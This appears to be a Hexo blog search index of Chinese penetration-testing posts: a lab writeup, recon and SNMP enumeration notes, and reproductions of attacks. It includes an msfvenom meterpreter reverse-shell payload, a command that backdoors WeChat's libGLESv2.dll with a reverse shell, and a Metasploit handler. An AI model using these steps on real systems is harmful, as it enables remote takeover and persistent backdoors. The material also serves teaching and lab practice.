<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2019/07/11/Redis-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/07/11/Redis-RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00:简介"></a>0x00:简介</h2><p><strong>Redis</strong>是一个使用<a href="https://zh.wikipedia.org/wiki/ANSI_C" target="_blank" rel="noopener">ANSI C</a>编写的<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%BA%90" target="_blank" rel="noopener">开源</a>、支持<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E8%84%91%E7%BD%91%E7%BB%9C" target="_blank" rel="noopener">网络</a>、基于<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98" target="_blank" rel="noopener">内存</a>、可选<a href="https://zh.wikipedia.org/w/index.php?title=%E6%8C%81%E4%B9%85%E6%80%A7_(%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="noopener">持久性</a>&amp;action=edit&amp;redlink=1)的<a href="https://zh.wikipedia.org/wiki/%E9%94%AE%E5%80%BC-%E5%80%BC%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="noopener">键值对存储数据库</a>。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01:影响范围"></a>0x01:影响范围</h2><p>Redis（&lt;= 5.0.5）</p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02:漏洞复现"></a>0x02:漏洞复现</h2><ol><li><p>漏洞利用工具：<a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce</a></p></li><li><p>环境</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>靶场Lazysysadmin_Writeup</title>
      <link href="/2019/07/08/%E9%9D%B6%E5%9C%BALazysysadmin-Writeup/"/>
      <url>/2019/07/08/%E9%9D%B6%E5%9C%BALazysysadmin-Writeup/</url>
      
        <content type="html"><![CDATA[<p>首先扫描端口服务</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562586230947.png" alt="1562586230947"></p><p>查看80端口web服务</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562592491025.png" alt="1562592491025"></p><p>robots.txt也没有什么有用的信息</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562592555834.png" alt="1562592555834"></p><p>扫出来的wordpress，phpmyadmin</p><p>此处强调了togie，mark一下</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/%E9%9D%B6%E5%9C%BALazysysadmin-Writeup.assets/1562590398333.png" alt="1562590398333"></p><p>后台通过注册得知用户有admin,togie，但没有弱口令。</p><p>wpscan扫一下，未找到可利用漏洞。</p><p>试下smb协议，列出共享文件夹，显示驱动、share$和空连接</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562588160160.png" alt="1562588160160"></p><p>查看share共享文件，发现网站目录</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562588187299.png" alt="1562588187299"></p><p>phpinfo中的信息webmaster和网站路径</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562590469769.png" alt="1562590469769"></p><p>deets.txt的密码12345</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562590541340.png" alt="1562590541340"></p><p>查看wordpress网站后台用户密码</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562587996538.png" alt="1562587996538"></p><p>三个用户：</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562589587355.png" alt="1562589587355"></p><p>同样的后台密码登陆了phpmyadmin，密码做了混淆</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562589566879.png" alt="1562589566879"></p><p>然后拿收集的账号和密码，试下22，最终togie用户12345登陆进去了</p><p><img src="/2019/07/08/靶场Lazysysadmin-Writeup/靶场Lazysysadmin-Writeup.assets/1562590310395.png" alt="1562590310395"></p><p>sudo一下就root了，好轻松额，当然还可以用内核提权EXP。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2019/07/03/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2019/07/03/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<p>msf</p><p>社工图片</p><p>powshell脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy RemoteSigned</span><br><span class="line">Set-ExecutionPolicy Restricted</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.29 LPORT=6666 -f psh-reflection  -o /root/door.ps1</span><br></pre></td></tr></table></figure><p><img src="/2019/07/03/图片马反弹shell/图片马反弹shell.assets/1562118666344.png" alt="1562118666344"></p><p><a href="https://github.com/peewpw/Invoke-PSImage" target="_blank" rel="noopener">https://github.com/peewpw/Invoke-PSImage</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2019/07/02/%E5%BE%AE%E4%BF%A1DDL%E5%8A%AB%E6%8C%81%E5%8F%8D%E5%BC%B9shell%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/07/02/%E5%BE%AE%E4%BF%A1DDL%E5%8A%AB%E6%8C%81%E5%8F%8D%E5%BC%B9shell%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>该实验达到的效果可用于提权或者后门维持权限，DDL劫持也可以用在其他软件上，思路是一样的。</p><h2 id="一、测试环境"><a href="#一、测试环境" class="headerlink" title="一、测试环境"></a>一、测试环境</h2><p>Kali Rolling    IP:192.168.10.29<br>Win7（安装微信，版本不限，本次测试的版本是2.6.8.52）    IP 为 192.168.10.15</p><h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.exe .\backdoor.py -f libGLESv2.dll -s reverse_shell_tcp_inline -P 6666 -H 192.168.10.29</span><br></pre></td></tr></table></figure><p><img src="/2019/07/02/微信DDL劫持反弹shell复现/微信DDL劫持反弹shell复现.assets/1562117408198.png" alt="1562117408198"></p><p>正常应该会有5个选项，哪个都行，但我选的这个只能用第2个，那就选它啦.</p><p><img src="/2019/07/02/微信DDL劫持反弹shell复现/微信DDL劫持反弹shell复现.assets/1562117466280.png" alt="1562117466280"></p><p>生成的后门文件在后门生成工具的<code>backfoored</code>目录里，将它替换掉原本的<code>libGLESv2.dll</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/shell_reverse_tcp </span><br><span class="line">set lport 6666</span><br><span class="line">set lhost 192.168.10.29</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2019/07/02/微信DDL劫持反弹shell复现/微信DDL劫持反弹shell复现.assets/1562118207686.png" alt="1562118207686"></p><p><img src="/2019/07/02/微信DDL劫持反弹shell复现/微信DDL劫持反弹shell复现.assets/1562118239850.png" alt="1562118239850"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>目标识别</title>
      <link href="/2019/06/24/%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB/"/>
      <url>/2019/06/24/%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="识别目标主机"><a href="#识别目标主机" class="headerlink" title="识别目标主机"></a>识别目标主机</h2><p>发现目标网络里的在线主机</p><p>注意：查看与客户达成的协议和服务条款，是否要求我们隐匿行踪，</p><p>或者在测试入侵检测系统(IDS)和入侵防御系统(IPS)时需要使渗透测试行动不被发现。</p><a id="more"></a><p><strong>ping</strong></p><p>使用基于ICPMP协议的<code>echo request</code>和<code>echo reply</code>两种消息类型</p><p>如果目标主机在线且允许接受Ping请求，那么目标主机将回复ICMP reply数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 -4/6 -s(packet size) example.com -I eth0(IPv6必须)</span><br></pre></td></tr></table></figure><p><code>ping6</code> 等同于 <code>ping -6</code></p><p><strong>arping</strong></p><p>arping是在局域网中使用<strong>ARP请求</strong>判断目标主机是否在线的工具，可以使用<strong>IP地址</strong>或<strong>MAC地址</strong>作为测试目标。</p><p>因为Arp工作在OSI模型中的第二层，ARP协议的数据包无法通过路由器和网关，所以他只能检测本地局域网络中的主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arping 192.168.10.1 -c 1</span><br><span class="line">arping -d -i eth0 192.168.10.2 -c 2</span><br></pre></td></tr></table></figure><p><strong>fping</strong> </p><p>同时探测<code>多个目标</code>/<code>整个网段</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fping 192.168.10.1 192.168.10.2 192.168.10.3 192.168.10.4</span><br><span class="line">fping -g 192.168.10.0/24</span><br><span class="line">fping -r 1 -g 18#重试次数</span><br><span class="line">fping -s www.baidu.com www.bankcomm.com#结果统计</span><br></pre></td></tr></table></figure><p><strong>hping3</strong></p><p>网络数据包生成和分析工具，在<code>TCP/IP测试</code>和<code>安全测试</code>里，用作端口扫描、防火墙规则测试、网络性能测试</p><p>主要用途：</p><ul><li>测试防火墙规则</li><li>测试IDS入侵检测系统</li><li>测试TCP/IP模式的安全漏洞</li></ul><p>命令行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -1 192.168.11.1 -c 1</span><br></pre></td></tr></table></figure><p>交互界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hping3</span><br><span class="line">#脚本</span><br><span class="line">hping send &#123;ip(daddr=192.168.11.1)+icmp(type=8,code=0)&#125;</span><br><span class="line">#监听</span><br><span class="line">hping recv eth0</span><br></pre></td></tr></table></figure><p>检测防火墙规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#发送ICMP echo请求</span><br><span class="line">hping3 hping3 -1 192.168.11.2 -c 1</span><br><span class="line">#如果防火墙禁止，则会提示不通</span><br><span class="line">hping3 192.168.11.2 -c 1 -S -p 22 -s 6060#对22端口发送SYN标识的TCP包</span><br><span class="line">hping3 -2 192.168.11.242 -c 1 -S -p 22 -s 6060 #发送UDP包</span><br></pre></td></tr></table></figure><p><strong>nping</strong>（Nmap的一部分）</p><ul><li><p>可以发送多种协议(TCP、UDP、ICMP和ARP协议)的数据包；</p></li><li><p>可以调整协议头字段，如TCP和UDP的源端口和目的端口；</p></li><li><p>可以探测多个主机的多个端口；</p></li><li><p>压力测试、ARP投毒、Dos攻击。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nping 192.168.10.1-30 -c 1</span><br><span class="line">nping --tcp -p 22 192.168.10.2 -c 1</span><br></pre></td></tr></table></figure><p><strong>THC–IPv6 Attack Toolkit</strong></p><p>alive6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alive6 -p eth0#探测内网IPv6主机</span><br><span class="line">ip6tables -A INPUT -p ipv6-icmp --type icmpv6-type 128 -j DROP #禁IPv6方式PING</span><br></pre></td></tr></table></figure><p>detect-new-ip6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">detect-new-ip6 eth0</span><br></pre></td></tr></table></figure><p>passive_discovery6</p><p>避免IDS检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passive_discovery6 eth0#开启监听，筛选ARP请求和回复</span><br></pre></td></tr></table></figure><p><strong>nbtscan</strong></p><p>审计Windows系统，获取NetBIOS信息。</p><p>将目标主机IP地址、NetBIOS计算机名、可用服务、登陆用户名和MAC地址整理为报告。如需使用NetBIOS协议访问目标主机的NetBIOS服务（例如网络共享），就需要知道目标主机的NetBIOS名称。</p><p>会产生大量网络流量，可能被目标主机记录日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nbtscan  192.168.11.1-254</span><br><span class="line">nbtscan  -hv 192.168.11.1-254#查看运行服务</span><br></pre></td></tr></table></figure><h2 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h2><p>也叫做操作系统指纹识别。</p><p>主动式识别—向目标机器发送数据包，根据目标的响应确定其使用的操作系统（快，但容易被发现）；</p><p>被动式识别—例如P0f工具，克服了主动式识别方法的缺点，但速度慢。</p><p><strong>p0f v3</strong></p><p>采用被动式识别方法，识别范围：</p><ul><li>连接到本机的机器（SYN模式，默认）；</li><li>可以访问到的主机（SYN+ACK模式）；</li><li>不能访问的机器（RST+模式）；</li><li>可以监控到其网络通信的机器。</li></ul><p>通过自身发出的TCP数据包分析操作系统的类型，统计在默认情况下不会产生的非标准数据包。比如，Linux默认使用64字节的ping数据报，而Windows 使用32字节的ping数据报；Windows的TTL是128，Linux的根据版本各有不同。p0f根据这些细微的差别识别远程主机的操作系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p0f -f /etc/p0f/p0f.fp -o p0f.log#开启监听，并分析数据包，保存为日志文件</span><br></pre></td></tr></table></figure><p><strong>Nmap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -o 192.168.10.2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 目标识别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SNMP信息收集</title>
      <link href="/2019/06/24/SNMP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2019/06/24/SNMP%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>snmp默认团体名属于snmp默认弱口令public/privicy。在win7本机上开启snmp服务，并添加pubilc团体名和允许远程连接后（window默认没有接受的团体名也就是社团名称，且不允许远程连接）</p> <a id="more"></a><h3 id="onesixtyone"><a href="#onesixtyone" class="headerlink" title="onesixtyone"></a>onesixtyone</h3><p>目标团体字符串为public</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onesixtyone 10.192.214.38 public#查看系统信息</span><br></pre></td></tr></table></figure><p>如果不知道，可以进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onesixtyone -c /usr/share 10.192.214.38 public</span><br></pre></td></tr></table></figure><p><img src="/2019/06/24/SNMP信息收集/1561108513808.png" alt="1561108513808"></p><p>查看onesixtyone目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -L onesixtyone</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap –sU –p161 –script=snmp-brute ip #查找snmp弱口令  </span><br><span class="line">nmap -sU -p161 --script=snmp-netstat ip#获取网络端口状态</span><br><span class="line">nmap –sU –p161 –script=snmp-sysdescr ip #获取系统信息</span><br><span class="line">nmap -sU -p161 --script=snmp-win32-user ip#获取用户信息</span><br></pre></td></tr></table></figure><h3 id="snmputil-exe"><a href="#snmputil-exe" class="headerlink" title="snmputil.exe"></a>snmputil.exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmputil walk ip public .1.3.6.1.2.1.25.4.2.1.2#列出系统进程</span><br><span class="line">snmputil walk ip public.1.3.6.1.2.1.25.6.3.1.2 #列出安装的软件</span><br><span class="line">snmputil walk ip public .1.3.6.1.2.1.1 #列出系统信息</span><br><span class="line">snmputil get  ip public .1.3.6.1.4.1.77.1.4.1.0 #列出域名</span><br><span class="line">snmputil walk ip public.1.3.6.1.4.1.77.1.2.25.1.1 #列系统用户列表</span><br></pre></td></tr></table></figure><h3 id="snmpwalk"><a href="#snmpwalk" class="headerlink" title="snmpwalk"></a>snmpwalk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#系统信息</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.1</span><br><span class="line"></span><br><span class="line">#系统进程列表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.25.4.2.1.2</span><br><span class="line"></span><br><span class="line">#安装软件列表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.25.6.3.1.2</span><br><span class="line"></span><br><span class="line">#网口的数量，类型，物理地址和流量信息等</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.2</span><br><span class="line"></span><br><span class="line">#IP地址和子网掩码</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.4.20</span><br><span class="line"></span><br><span class="line">#IP-MAC地址转换表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.3.1</span><br><span class="line"></span><br><span class="line">#路由表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.4.21</span><br><span class="line"></span><br><span class="line">#tcp connection table | netstat -t</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.6.13</span><br><span class="line"></span><br><span class="line">#开放的UDP端口</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.7.5</span><br><span class="line"></span><br><span class="line">#系统总内存</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.25.2.2</span><br><span class="line"></span><br><span class="line">#获取账号</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.2011.5.2.1.10.1</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.2011.10.2.12.1.1.1</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.25506.2.12.1.1.1</span><br><span class="line"></span><br><span class="line">#系统用户数</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 hrSystemNumUsers</span><br><span class="line"></span><br><span class="line">#列出域名</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.77.1.4.1.0</span><br><span class="line"></span><br><span class="line">#系统用户列表</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.4.1.77.1.2.25.1.1</span><br><span class="line"></span><br><span class="line">#得到Windows端的系统进入用户数等</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38 .1.3.6.1.2.1.25.1</span><br><span class="line"></span><br><span class="line">#获取所有信息</span><br><span class="line">snmpwalk -c public -v 1 10.192.214.38</span><br></pre></td></tr></table></figure><p>参考：</p><p>SNMP弱口令漏洞的使用 <a href="https://www.cnblogs.com/-wenli/p/9571057.html" target="_blank" rel="noopener">https://www.cnblogs.com/-wenli/p/9571057.html</a></p><p>snmp默认团体名/弱口令漏洞及安全加固 <a href="https://cloud.tencent.com/developer/news/14370" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/14370</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SNMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2019/06/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2019/06/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集分类"><a href="#信息收集分类" class="headerlink" title="信息收集分类"></a>信息收集分类</h1><ul><li>被动信息收集：不直接接触目标，而是通过搜索引擎或者爬虫系统等第三方服务来获取关于目标的信息（信息相对较少，但不会被发现）</li><li>主动信息收集：攻击者或者渗透测试人员通过工具去主动去探测或者收集目标的信息，直接和目标接触（获取的信息相对多一些，但是可能会被各种设备捕获到扫描行为）</li></ul><p><strong>从web安全的角度来考虑</strong></p><ol><li>域名(whois注册相关信息，子域名，备案信息)</li><li>服务器(DNS信息，端口服务，真实IP，系统类型和版本：用来搜索是否符合某个漏洞)</li><li>web应用(网站架构(操作系统、中间件、数据库、编程语言)，指纹信息，探测WAF，敏感目录及信息，源码泄露(搜索引擎+工具)，脆弱系统(网络空间)，旁站，c段)</li><li><p>企业信息(天眼查，企业信用信息公示系统，企业员工信息)</p><a id="more"></a></li></ol><h2 id="1-域名信息"><a href="#1-域名信息" class="headerlink" title="1. 域名信息"></a>1. 域名信息</h2><h3 id="Whois信息和Whois反查"><a href="#Whois信息和Whois反查" class="headerlink" title="Whois信息和Whois反查"></a>Whois信息和Whois反查</h3><p><strong>获取的信息</strong></p><ul><li>注册人信息（注册商，联系人，联系邮箱，联系电话，创建时间等）</li><li>DNS服务器信息</li></ul><p><strong>whois查询的网站</strong></p><ul><li><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p></li><li><p><a href="https://s.threatbook.cn/" target="_blank" rel="noopener">https://s.threatbook.cn/</a></p></li><li><p><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a></p></li><li><p><a href="https://www.internic.net/whois.html" target="_blank" rel="noopener">InterNIC | Whois</a></p></li><li><a href="http://whois.domaintools.com/" target="_blank" rel="noopener">DomainTools-Whois Lookup, Domain&amp;IP </a></li></ul><p>whois命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois example.com</span><br></pre></td></tr></table></figure><h3 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h3><p>当开始做安全评估时，通常都是一个简单的域名或者是一组域名，通过发现更多的目标资源，比如目标组织的域名、服务器、web应用程序等，来增加找到漏洞的机会</p><p><strong>子域名枚举原因</strong></p><ul><li>子域名枚举可以在测试范围内发现更多的域或子域，这会增加漏洞发现的几率。</li><li>有些隐藏的、被忽略的子域上运行的应用程序可能会帮助我们发现漏洞。</li><li>在同一个组织的不同域或应用程序中很可能会存在相同类型的漏洞。</li></ul><p><strong>子域名枚举方法</strong></p><p><strong>搜索引擎</strong></p><p>使用多家搜索引擎</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com// google hacking</span><br><span class="line">site:target.com-www// -号去除已知子域名</span><br></pre></td></tr></table></figure><p><strong>证书</strong></p><p>Certificate Transparency(CT)是一个项目，在这个项目中，证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中。SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</p><p>查找一个域名证书的最简单方法是使用搜索引擎来收集计算机的CT日志，并让任何搜索引擎搜索它们。下面仅列出了比较常用的几种：</p><ol><li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li><li><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li><li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li><li><a href="https://www.google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li></ol><p>这里是github上的脚本<a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration，简化使用CT日志搜索引擎查找子域名的流程" target="_blank" rel="noopener">https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration，简化使用CT日志搜索引擎查找子域名的流程</a></p><p>在子域名枚举中使用CT的缺点是，在CT日志中找到的域名可能不再存在，因此它们不能被解析为IP地址。可以使用诸如massdns这样与CT日志结合的工具来快速识别可解析的域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ct.py - 从CT日志中提取域名(同时提供给massdns)# massdns - 将找到可解析的域名并将它们保存到结果文件中</span><br><span class="line">./ct.py icann.org | ./bin/massdns -r resolvers.txt -t A -q -a -o -w icann_resolvable_domains.txt</span><br></pre></td></tr></table></figure><p><strong>自治系统</strong></p><p>找到自治系统号将帮助我们识别属于一个组织的网段，这个组织中可能有有效的域名。</p><ul><li><p>使用dig或host解析给定域名的IP地址</p></li><li><p>提供IP地址就可以找到ASN的工具——<a href="https://asn.cymru.com/cgi-bin/whois.cgi" target="_blank" rel="noopener">https://asn.cymru.com/cgi-bin/whois.cgi</a></p></li><li><p>提供域名就可以找到ASN的工具——<a href="http://bgp.he.net/" target="_blank" rel="noopener">http://bgp.he.net/</a></p><p><img src="/2019/06/24/信息收集/1557756286612.png" alt="1557756286612"></p></li><li><p>发现的ASN编号可以用来查找域名的网段。有Nmap脚本可以实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://nmap.org/nsedoc/scripts/targets-asn.html</span><br><span class="line">$ nmap --script targets-asn --script-args targets-asn.asn=45090 &gt; netblocks.txt</span><br></pre></td></tr></table></figure></li></ul><p><strong>前端</strong></p><p>爬URL crossdomain.xml</p><p><strong>字典爆破</strong></p><p>DNSRecon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnsrecon.py -n ns1.insecuredns.com –d insecuredns.com -D subdomains-top1mil-5000.txt -t brt</span><br></pre></td></tr></table></figure><p><a href="https://www.webshell.cc/6384.html" target="_blank" rel="noopener">layer子域名挖掘机</a></p><p>除了字典爆破，还可以进行扫描端口和探测服务器类型</p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p>这是Lcy大佬的在线子域名爆破工具    </p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a> - 是一个纯粹的子域名爆破脚本。基于字典，扫描速度快，支持多线程。 </p><p>Subdomainbrute（子域名爆破工具）通过字典去探测子域名，依赖dnspython插件 